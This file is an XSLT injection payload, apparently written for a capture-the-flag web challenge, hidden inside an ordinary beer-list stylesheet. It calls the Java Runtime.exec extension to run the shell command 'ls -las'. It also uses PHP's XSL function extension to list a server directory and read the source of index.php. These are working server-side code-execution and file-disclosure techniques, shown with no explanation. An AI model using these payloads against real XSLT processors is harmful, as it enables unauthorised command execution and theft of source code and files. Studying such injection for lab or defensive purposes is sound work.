<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
      xmlns:php="http://php.net/xsl" 
      xmlns:exsl="http://exslt.org/common"
      xmlns:runtime="http://xml.apache.org/xalan/java/java.lang.Runtime" 
      xmlns:process="http://xml.apache.org/xalan/java/java.lang.Process" 
    extension-element-prefixes="exsl" xsl:version="1.0"> 
<body style="font-family:Arial;font-size:9pt;background-color:#AABBCC">
<xsl:variable name="rtobject" select="runtime:getRuntime()"/> 
<xsl:variable name="process" select="runtime:exec($rtobject,’ls -las’)"/> 
<xsl:variable name="waiting" select="process:waitFor($process)"/> 
<xsl:value-of select="$process"/>
    
<xsl:variable  name="scand"   select="php:function('scandir','/challenge/web-serveur/ch50')" mode="serialize" />
<xsl:variable  name="header"  select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')"/>
<xsl:for-each select="beers/beer">
<div style="background-color:teal;color:white;padding:4px">
<span style="font-weight:bold">
 DIR2 scan:<xsl:value-of select="$scand"/>       
 DIR1 index.php:<xsl:value-of select="$header"/>   
<xsl:value-of select="name"/>
- 
</span>
<xsl:value-of select="price"/>
</div>
<div style="margin-left:20px;margin-bottom:1em;font-size:12pt">
<p>
<xsl:value-of select="description"/>
<span style="font-style:italic">
(
<xsl:value-of select="prct"/>
%)
</span>
</p>
</div>
</xsl:for-each>
</body>
</html>
